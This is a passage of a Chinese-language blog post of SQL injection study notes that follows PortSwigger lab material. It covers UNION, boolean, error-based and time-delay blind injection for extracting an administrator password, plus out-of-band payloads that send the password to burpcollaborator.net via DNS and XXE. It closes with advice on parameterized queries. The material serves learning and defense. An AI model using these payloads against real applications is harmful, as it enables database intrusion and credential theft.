class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line">MyDatabase     dbo           Products    BASE TABLE</span><br><span class="line">MyDatabase     dbo           Users       BASE TABLE</span><br><span class="line">MyDatabase     dbo           Feedback    BASE TABLE</span><br></pre></td></tr></table></figure></div>
+<p>然后， 可以查询information_schema.columns来列出各个表中的列：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> information_schema.<span class="keyword">columns</span> <span class="keyword">WHERE</span> <span class="built_in">table_name</span> = <span class="string">&#x27;Users&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>一半的步骤包括，确定字段数，判断有用数据类型的列，查表名，查列名，查询想要的信息</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+UNION+SELECT+&#x27;</span>abc<span class="string">&#x27;,&#x27;</span>def<span class="string">&#x27;--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span>+<span class="keyword">UNION</span>+<span class="keyword">SELECT</span>+<span class="built_in">table_name</span>,+<span class="keyword">NULL</span>+<span class="keyword">FROM</span>+information_schema.<span class="keyword">tables</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=&#x27;</span>users_abcdef<span class="string">&#x27;--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span>+<span class="keyword">UNION</span>+<span class="keyword">SELECT</span>+username_abcdef,+password_abcdef+<span class="keyword">FROM</span>+users_abcdef<span class="comment">--</span></span><br></pre></td></tr></table></figure></div>
+
+<p>在 Oracle 上， 可以找到如下相同的信息：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> all_tables</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> <span class="built_in">table_name</span> = <span class="string">&#x27;USERS&#x27;</span></span><br></pre></td></tr></table></figure></div>
+<p>其他类型的数据库的内容在sql速查表里面看<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p>
+<h2 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h2><p>什么是sql盲注？ 当应用程序的数据库查询的返回信息不回显在http响应的时候，但是又容易受到sql注入攻击，就叫做sql盲注。很多技术对sql盲注没有效果，比如uinon攻击，但是还是可以进行sql注入，通过别的方式</p>
+<h3 id="通过触发条件响应进行盲sql注入"><a href="#通过触发条件响应进行盲sql注入" class="headerlink" title="通过触发条件响应进行盲sql注入"></a>通过触发条件响应进行盲sql注入</h3><p>假设有一个应用程序使用跟踪 Cookie 来收集使用情况分析数据。对该应用程序的请求包含如下 Cookie 标头：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="attribute">TrackingId</span>=u5YD3PapBcR4lN3e7Tj4</span><br></pre></td></tr></table></figure></div>
+
+<p>当处理包含TrackingId cookie 的请求时，应用程序使用 SQL 查询来确定这是否是已知用户：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TrackingId <span class="keyword">FROM</span> TrackedUsers <span class="keyword">WHERE</span> TrackingId = <span class="string">&#x27;u5YD3PapBcR4lN3e7Tj4&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>此查询容易受到 SQL 注入攻击，但查询结果不会返回给用户。不过，应用程序的行为会根据查询是否返回任何数据而有所不同。如果 提交已识别的TrackingId ，查询将返回数据， 会在响应中收到“欢迎回来”消息。</p>
+<p>所以就可以利用这种条件来进行sql注入，通过触发不同的响应来检索信息<br>假设发送了两个请求，其中依次包含以下TrackingId cookie 值：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">…xyz&#x27; AND &#x27;<span class="number">1</span>&#x27;=&#x27;<span class="number">1</span></span><br><span class="line">…xyz&#x27; AND &#x27;<span class="number">1</span>&#x27;=&#x27;<span class="number">2</span>  </span><br></pre></td></tr></table></figure>
+<p>这些值中的第一个值导致查询返回结果，因为注入的AND ‘1’&#x3D;’1条件为真。结果，显示“欢迎回来”消息。<br>第二个值导致查询不返回任何结果，因为注入的条件为假。不显示“欢迎回来”消息。</p>
+<p>例如，假设有一个名为Users的表，其中包含Username和Password列，以及一个名为Administrator的用户。 可以通过发送一系列输入来一次一个字符地测试密码，从而确定此用户的密码。</p>
+<p>这使我们能够确定任何单个注入条件的答案，并一次提取一个数据。</p>
+<p>例如，假设有一个名为Users的表，其中包含Username和Password列，以及一个名为Administrator的用户。 可以通过发送一系列输入来一次一个字符地测试密码，从而确定此用户的密码。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xyz<span class="string">&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;</span>Administrato<span class="string">r&#x27;), 1, 1) &gt; &#x27;</span>m</span><br></pre></td></tr></table></figure></div>
+
+<p>这将返回“欢迎回来”消息，表明注入的条件为真，因此密码的第一个字符大于m 。</p>
+<p>最终，我们发送以下输入，返回“欢迎回来”消息，从而确认密码的第一个字符是s ：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xyz<span class="string">&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;</span>Administrato<span class="string">r&#x27;), 1, 1) = &#x27;</span>s</span><br></pre></td></tr></table></figure></div>
+<p>我们可以继续这个过程，系统地确定Administrator用户的完整密码。</p>
+<p><img src="https://pic1.imgdb.cn/item/67c9c8d1066befcec6df56bb.png"><br>比如在这个例子中，我们根据返回的内容是否有welcome判断，然后判断出了有users表和administrator这个用户，用条件响应来确定密码的长度<br><img src="https://pic1.imgdb.cn/item/67c9ced3066befcec6df57d6.png"><br>然后用substring这个函数，截取密码里面的一个字，在substring的第一个数字和最后的’a’加上攻击符，进行判断，然后逐位爆破出密码</p>
+<h3 id="基于错误的-SQL-注入"><a href="#基于错误的-SQL-注入" class="headerlink" title="基于错误的 SQL 注入"></a>基于错误的 SQL 注入</h3><p>基于错误的 SQL 注入是指 能够使用错误消息从数据库中提取或推断敏感数据的情况，即使在盲目情况下也是如此。可能性取决于数据库的配置和 能够触发的错误类型：</p>
+<h4 id="通过触发条件错误来利用盲-SQL-注入"><a href="#通过触发条件错误来利用盲-SQL-注入" class="headerlink" title="通过触发条件错误来利用盲 SQL 注入"></a>通过触发条件错误来利用盲 SQL 注入</h4><p>某些应用程序执行 SQL 查询，但无论查询是否返回任何数据，其行为都不会改变。上一节中的技术不起作用，因为注入不同的布尔条件不会对应用程序的响应产生影响。<br>通常，可以根据是否发生 SQL 错误来诱导应用程序返回不同的响应。 可以修改查询，使其仅在条件为真时才导致数据库错误。通常，数据库抛出的未处理错误会导致应用程序的响应有所不同，例如错误消息。这使 能够推断出注入条件的真实性。<br>假设发送了两个请求，它们分别包含以下TrackingId cookie 值：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xyz&#x27; <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">1</span>=<span class="number">2</span>) <span class="keyword">THEN</span> <span class="number">1</span>/<span class="number">0</span> <span class="keyword">ELSE</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">END</span>)=<span class="symbol">&#x27;a</span></span><br><span class="line">xyz&#x27; <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">1</span>=<span class="number">1</span>) <span class="keyword">THEN</span> <span class="number">1</span>/<span class="number">0</span> <span class="keyword">ELSE</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">END</span>)=<span class="symbol">&#x27;a</span></span><br></pre></td></tr></table></figure></div>
+<p>这些输入使用CASE关键字来测试条件，并根据表达式是否为真返回不同的表达式</p>
+<ul>
+<li>对于第一个输入， CASE表达式计算结果为’a’ ，这不会导致任何错误。</li>
+<li>对于第二个输入，其计算结果为1&#x2F;0 ，这会导致除以零的错误。<br>如果错误导致应用程序的 HTTP 响应出现差异，则可以由此确定注入的条件是否为真。</li>
+</ul>
+<p>通过这个方法可以一次确定一个字符</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xyz<span class="string">&#x27; AND (SELECT CASE WHEN (Username = &#x27;</span>Administrato<span class="string">r&#x27; AND SUBSTRING(Password, 1, 1) &gt; &#x27;</span>m<span class="string">&#x27;) THEN 1/0 ELSE &#x27;</span>a<span class="string">&#x27; END FROM Users)=&#x27;</span>a</span><br></pre></td></tr></table></figure></div>
+<p>利用方式和上一题也很像，只是我们观察返回有没有错误<br><img src="https://pic1.imgdb.cn/item/67ca608b066befcec6dfa0b9.png"><br>q954u104nkbmrmvdwvft</p>
+<h4 id="通过详细的-SQL-错误消息提取敏感数据"><a href="#通过详细的-SQL-错误消息提取敏感数据" class="headerlink" title="通过详细的 SQL 错误消息提取敏感数据"></a>通过详细的 SQL 错误消息提取敏感数据</h4><p>数据库配置错误有时会导致详细的错误消息。这些消息可能会为攻击者提供有用的信息。例如，请考虑以下错误消息，该消息在将单引号注入id参数后出现：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unterminated string literal started <span class="keyword">at</span> position <span class="number">52</span> <span class="keyword">in</span> <span class="keyword">SQL</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> tracking <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;&#x27;&#x27;. Expected char</span></span><br></pre></td></tr></table></figure></div>
+<p>有时， 可以诱导应用程序生成包含查询返回的部分数据的错误消息。这有效地将原本盲目的 SQL 注入漏洞变成了可见漏洞。<br> 可以使用CAST()函数来实现这一点。它使 能够将一种数据类型转换为另一种数据类型。例如，假设一个查询包含以下语句：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CAST((<span class="keyword">SELECT</span> example_column <span class="keyword">FROM</span> example_table) <span class="keyword">AS</span> <span class="type">int</span>)</span><br></pre></td></tr></table></figure></div>
+<p>通常， 尝试读取的数据是字符串。尝试将其转换为不兼容的数据类型（例如int ）可能会导致类似于以下内容的错误：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SUBUNIT"><figure class="iseeu highlight /subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ERROR: </span>invalid input syntax for type integer: &quot;Example data&quot;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="通过触发时间延迟来利用盲-SQL-注入"><a href="#通过触发时间延迟来利用盲-SQL-注入" class="headerlink" title="通过触发时间延迟来利用盲 SQL 注入"></a>通过触发时间延迟来利用盲 SQL 注入</h4><p>如果应用程序在执行 SQL 查询时捕获数据库错误并妥善处理它们，则应用程序的响应不会有任何差异。这意味着以前用于诱导条件错误的技术将不起作用。<br>在这种情况下，通常可以通过触发时间延迟（具体取决于注入条件是真还是假）来利用盲 SQL 注入漏洞。由于应用程序通常同步处理 SQL 查询，因此延迟执行 SQL 查询也会延迟 HTTP 响应。这允许 根据接收 HTTP 响应所花费的时间来确定注入条件的真实性。<br>触发时间延迟的技术特定于所使用的数据库类型。例如，在 Microsoft SQL Server 上， 可以使用以下命令测试条件并根据表达式是否为真触发延迟：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; IF (1=2) WAITFOR DELAY &#x27;</span>0:0:10<span class="string">&#x27;--</span></span><br><span class="line"><span class="string">&#x27;</span>; <span class="keyword">IF</span> (<span class="attribute">1</span>=1) WAITFOR DELAY <span class="string">&#x27;0:0:10&#x27;</span>--</span><br></pre></td></tr></table></figure></div>
+<p>使用这种技术，我们可以通过一次测试一个字符来检索数据</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; IF (SELECT COUNT(Username) FROM Users WHERE Username = &#x27;</span>Administrato<span class="string">r&#x27; AND SUBSTRING(Password, 1, 1) &gt; &#x27;</span>m<span class="string">&#x27;) = 1 WAITFOR DELAY &#x27;</span><span class="number">0</span>:<span class="number">0</span>:&#123;delay&#125;<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure></div>
+<h4 id="使用带外-OAST-技术利用盲-SQL-注入"><a href="#使用带外-OAST-技术利用盲-SQL-注入" class="headerlink" title="使用带外 (OAST) 技术利用盲 SQL 注入"></a>使用带外 (OAST) 技术利用盲 SQL 注入</h4><p>应用程序可能会执行与上一个示例相同的 SQL 查询，但以异步方式执行。应用程序继续在原始线程中处理用户的请求，并使用另一个线程使用跟踪 cookie 执行 SQL 查询。该查询仍然容易受到 SQL 注入攻击，但到目前为止描述的任何技术都不起作用。应用程序的响应不依赖于查询返回的任何数据、发生的数据库错误或执行查询所花费的时间。<br>在这种情况下，通常可以通过触发与 控制的系统之间的带外网络交互来利用盲 SQL 注入漏洞。这些可以根据注入的条件触发，以一次推断一条信息。更有用的是，数据可以直接在网络交互中泄露。<br>有多种网络协议可用于此目的，但通常最有效的是 DNS（域名服务）。许多生产网络允许 DNS 查询自由出站，因为它们对于生产系统的正常运行至关重要。<br>触发 DNS 查询的技术特定于所使用的数据库类型。例如，Microsoft SQL Server 上的以下输入可用于在指定域上引发 DNS 查找：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;; exec master..xp_dirtree &#x27;<span class="comment">//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a&#x27;--</span></span><br></pre></td></tr></table></figure>
+<p>确认了触发带外交互的方法后，你就可以使用带外通道从易受攻击的应用程序中窃取数据。例如</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username=&#x27;</span>Administrato<span class="string">r&#x27;);exec(&#x27;</span>master..xp_dirtree <span class="string">&quot;//&#x27;+@p+&#x27;.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a&quot;</span><span class="string">&#x27;)--</span></span><br></pre></td></tr></table></figure></div>
+<p>此输入读取Administrator用户的密码，附加唯一的 Collaborator 子域，并触发 DNS 查找。此查找允许 查看捕获的密码：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S3cure<span class="selector-class">.cwcsgt05ikji0n1f2qlzn5118sek29</span><span class="selector-class">.burpcollaborator</span>.net</span><br></pre></td></tr></table></figure></div>
+<p>（关于这些dns的payload都在<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet%EF%BC%89">https://portswigger.net/web-security/sql-injection/cheat-sheet）</a><br><img src="https://pic1.imgdb.cn/item/67caac3a066befcec6e0368e.png"><br>如果在COLLABORATOR中看到访问记录的话，就说明成功了<br>带外 (OAST) 技术是检测和利用盲 SQL 注入的有效方法，因为它的成功率很高，并且能够直接窃取带外通道内的数据。因此，即使在其他盲目利用技术有效的情况下，OAST 技术通常也是首选。<br>比如利用下面这个payload拿到admin的密码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=x&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;<span class="meta">&lt;!DOCTYPE+root+[+<span class="meta">&lt;!ENTITY+%25</span></span></span><br><span class="line"><span class="meta"><span class="meta">+remote+SYSTEM+<span class="string">&quot;http%3a//&#x27;||(SELECT+password+FROM+users+WHERE+username%3d&#x27;administrator&#x27;)||&#x27;.BURP-COLLABORATOR-SUBDOMAIN/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">+%25remote%3b]&gt;</span>&#x27;),&#x27;/l&#x27;)+FROM+dual--</span><br></pre></td></tr></table></figure></div>
+<p>在COLLABORATOR的响应中看到的dns在COLLABORATOR payload前面的字符串就是密码<br><img src="https://pic1.imgdb.cn/item/67caaf48066befcec6e03c91.png"></p>
+<h2 id="如何防止sql注入"><a href="#如何防止sql注入" class="headerlink" title="如何防止sql注入"></a>如何防止sql注入</h2><p> 可以使用参数化查询（而不是查询中的字符串连接）来防止大多数 SQL 注入实例。这些参数化查询也称为“准备好的语句”。<br>下代码容易受到 SQL 注入攻击，因为用户输入直接连接到查询中：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String query = &quot;SELECT * FROM products WHERE category = &#x27;&quot;+ <span class="keyword">input</span> + &quot;&#x27;&quot;;</span><br><span class="line"><span class="keyword">Statement</span> <span class="keyword">statement</span> = <span class="keyword">connection</span>.createStatement();</span><br><span class="line">ResultSet resultSet = <span class="keyword">statement</span>.executeQuery(query);</span><br></pre></td></tr></table></figure></div>
+<p>可以重写此代码，以防止用户输入干扰查询结构：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PreparedStatement <span class="keyword">statement</span> = <span class="keyword">connection</span>.prepareStatement(&quot;SELECT * FROM products WHERE category = ?&quot;);</span><br><span class="line"><span class="keyword">statement</span>.setString(<span class="number">1</span>, <span class="keyword">input</span>);</span><br><span class="line">ResultSet resultSet = <span class="keyword">statement</span>.executeQuery();</span><br></pre></td></tr></table></figure></div>
+
+<p>对于不受信任的输入作为查询中的数据出现的任何情况， 都可以使用参数化查询，包括WHERE子句和INSERT或UPDATE语句中的值。它们不能用于处理查询其他部分中的不受信任的输入，例如表或列名称，或ORDER BY子句。将不受信任的数据放入查询的这些部分的应用程序功能需要采取不同的方法，例如：</p>
+<ul>
+<li>将允许的输入值列入白名单。</li>
+<li>使用不同的逻辑来提供所需的行为。</li>
+</ul>
+<p>为了使参数化查询能够有效防止 SQL 注入，查询中使用的字符串必须始终是硬编码常量。它绝不能包含任何来源的变量数据。不要试图逐个确定某项数据是否可信，在被视为安全的情况下继续在查询中使用字符串连接。很容易对数据的可能来源产生错误判断，或者对其他代码进行更改以污染可信数据。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/21833.html" title="SQL漏洞学习笔记">https://guayu-kakeru.github.io/posts/21833.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"># 笔记</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag"># 漏洞</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/23894.html" rel="prev" title="HMV-SuidyRevenge">
+      <i class="fa fa-chevron-left"></i> HMV-SuidyRevenge
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5-sqli"><span class="nav-text">什么是SQL注入(sqli)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B"><span class="nav-text">如何检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%A4%BA%E4%BE%8B"><span class="nav-text">SQL注入示例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E7%B4%A2%E9%9A%90%E8%97%8F%E6%95%B0%E6%8D%AE"><span class="nav-text">检索隐藏数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B9%E5%8F%98%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%80%BB%E8%BE%91"><span class="nav-text">改变应用程序的逻辑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8E%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E8%A1%A8%E6%A3%80%E7%B4%A2%E4%BF%A1%E6%81%AF-UNION%E6%94%BB%E5%87%BB"><span class="nav-text">从其他数据表检索信息 (UNION攻击)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A1%AE%E5%AE%9A%E6%89%80%E9%9C%80%E7%9A%84%E5%88%97%E6%95%B0"><span class="nav-text">确定所需的列数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E5%AE%9A%E7%9A%84%E8%AF%AD%E6%B3%95"><span class="nav-text">数据库特定的语法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE%E5%85%B7%E6%9C%89%E6%9C%89%E7%94%A8%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%88%97"><span class="nav-text">查找具有有用数据类型的列</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-SQL-%E6%B3%A8%E5%85%A5-UNION-%E6%94%BB%E5%87%BB%E6%9D%A5%E6%A3%80%E7%B4%A2%E6%9C%89%E8%B6%A3%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="nav-text">使用 SQL 注入 UNION 攻击来检索有趣的数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A3%80%E7%B4%A2%E5%8D%95%E4%B8%AA%E5%88%97%E4%B8%AD%E7%9A%84%E5%A4%9A%E4%B8%AA%E5%80%BC"><span class="nav-text">检索单个列中的多个值</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="nav-text">常见数据库中检查是否存在sql注入攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E5%92%8C%E7%89%88%E6%9C%AC"><span class="nav-text">查询数据库类型和版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%86%85%E5%AE%B9"><span class="nav-text">列出数据库的内容</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E7%9B%B2%E6%B3%A8"><span class="nav-text">sql盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6%E5%93%8D%E5%BA%94%E8%BF%9B%E8%A1%8C%E7%9B%B2sql%E6%B3%A8%E5%85%A5"><span class="nav-text">通过触发条件响应进行盲sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84-SQL-%E6%B3%A8%E5%85%A5"><span class="nav-text">基于错误的 SQL 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6%E9%94%99%E8%AF%AF%E6%9D%A5%E5%88%A9%E7%94%A8%E7%9B%B2-SQL-%E6%B3%A8%E5%85%A5"><span class="nav-text">通过触发条件错误来利用盲 SQL 注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" 